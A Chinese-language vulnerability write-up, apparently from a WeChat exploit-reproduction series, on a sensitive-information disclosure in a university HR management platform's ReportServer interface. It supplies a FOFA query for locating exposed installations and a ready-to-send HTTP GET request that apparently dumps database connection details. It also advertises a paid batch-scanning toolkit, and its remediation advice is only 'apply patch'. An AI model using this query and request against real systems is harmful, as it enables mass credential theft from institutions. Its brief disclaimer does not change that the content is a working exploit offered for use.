#  高校人力资源管理服务平台系统ReportServer接口存在敏感信息泄露漏洞 附POC   
2024-10-23更新  南风漏洞复现文库   2024-10-23 23:13  
  
免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
## 1. 高校人力资源管理服务平台系统简介  
  
微信公众号搜索：南风漏洞复现文库 该文章 南风漏洞复现文库 公众号首发  
  
高校人力资源管理服务平台系统  
## 2.漏洞描述  
  
高校人力资源管理服务平台系统ReportServer接口存在敏感信息泄露漏洞  
  
CVE编号:  
  
CNNVD编号:  
  
CNVD编号:  
## 3.影响版本  
  
高校人力资源管理服务平台系统  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsJDm7fvc3bykQuVhtjkibKubmMr2tnMvywUC5QicqyrCNZaibbhx7Cl2JmgFCWaOManQAyZvY7mJ1kF2HvKNJic1A/640?wx_fmt=png&from=appmsg "null")  
  
高校人力资源管理服务平台系统ReportServer接口存在敏感信息泄露漏洞  
## 4.fofa查询语句  
  
body="FM_SYS_ID"||body="product/recruit/website/RecruitIndex.jsp"  
## 5.漏洞复现  
  
漏洞链接：https://xx.xx.xx.xx/ReportServer?op=Fr_server&cmd=Sc_getconnectioninfo  
  
漏洞数据包：  
```
GET /ReportServer?op=Fr_server&cmd=Sc_getconnectioninfo HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept: */*
Connection: Keep-Alive
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bykQuVhtjkibKubmMr2tnMvVdy5o5J3LntGM9Fm5ozCibGgobL7yAx0nkhNxviafDfQgrYMoibtb5wgA/640?wx_fmt=jpeg&from=appmsg "null")  
## 6.POC&EXP  
  
本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全1: 更新poc批量扫描软件，承诺，一周更新8-14个插件吧，我会优先写使用量比较大程序漏洞。2: 免登录，免费fofa查询。3: 更新其他实用网络安全工具项目。4: 免费指纹识别，持续更新指纹库。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bykQuVhtjkibKubmMr2tnMvLzHczmu5cJ1W1EcfuhhKqcYcR62xHMwfJ2VJ1XyqoMwzOGt23TYd1Q/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bykQuVhtjkibKubmMr2tnMvMJAEEpUic0X8SWK3S2MWX1bB9svoMIFUFAobadrYlrNhtfWJ1RjhTyA/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bykQuVhtjkibKubmMr2tnMv5MY4KQibUtLr8ibEoDerD7pbaibtz2fbiaKYH6AQZMl2l9XWjvzQL9alzw/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bykQuVhtjkibKubmMr2tnMv3MV3dFDOWKD5gIouS4T4qrcWjv7RBDy550tuJ0rT2Hel4ZA4BO2TNA/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bykQuVhtjkibKubmMr2tnMvfTAcRSWiaVQjt3b3E3B9DC3Wa6O7XiaOVAEoiah1JmfLBxbb64s9kh2PQ/640?wx_fmt=jpeg&from=appmsg "null")  
## 7.整改意见  
  
打补丁  
## 8.往期回顾  
  
  
[畅捷通TPlus FileUploadHandler.ashx存在任意文件上传漏洞 附POC](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247487588&idx=1&sn=39be759d6fe21c5a270a606bcdaf2076&chksm=974b9d63a03c1475d88ebcce4829dd0f50e88e1b6d6488a32652135013f80771b3b2cad5f149&scene=21#wechat_redirect)  
  
  
